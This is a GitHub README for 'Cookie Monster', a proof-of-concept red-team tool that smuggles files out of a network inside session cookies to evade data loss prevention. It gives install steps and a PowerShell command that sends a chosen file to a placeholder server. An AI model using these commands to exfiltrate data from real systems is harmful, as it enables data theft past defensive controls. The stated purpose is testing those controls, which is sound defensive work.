# Cookie Monster

![alt text](https://github.com/ProfessionallyEvil/cookie-monster/blob/main/CookieMonster.png?raw=true)

## What is Cookie Monster?

Cookie Monster is a proof-of-concept data exfiltration tool. The basic premise behind it is hiding sensitive data in plain sight, within session cookies in web traffic, to evade detection by data loss prevention solutions. It consists of a two parts, a _feeder_ client run from within the target's network, and a _server_ for capturing the feeder's request and reassembling the data.

## Is this a hacking tool?

It can be used to transfer files, however it's a fairly immature, barebones implementation. In it's current form, it's better suited to testing the defensive controls than it is for an significant, malicious activity.

## Installation
The server can be installed by the following command on a system with Node (the current codebase has been primarily tested on Node 18, but some earlier versions should work) `npm install --global @professionallyevil/cookie-monster-exfil`

You will also need a feeder, which can be found attached to the [releases](https://github.com/ProfessionallyEvil/cookie-monster/releases/tag/v2.0.3) on this repo. 

## Usage
### Starting the server
`cookie-monster --out ./outputDir`

### Running the Powershell Feeder 
 1. Import the module: `Import-Module .\CookieMonsterFeeder.ps1`
 1. Send a file with: `Invoke-CMfeed -URL 'https://yourcookiemonsterserver.test' -file .\file.txt`, where the file matches the file you want to send, and the URL is the protocol, hostname, and optionally the port of your server. e.g. `http://127.0.0.1:3000`, `https://professionallyevil.com`.

## Additional Notes
- The core functionality is working, but there is some functionality that is known to be missing. Skim the patch notes (they're concise) for details.
- There's no built-in support for using certificated and TLS directly through this app. If using for actual sensitive data, if is *strongly* recommended that you put it behind a reverse proxy that does support HTTPS, and to only use TLS for it.
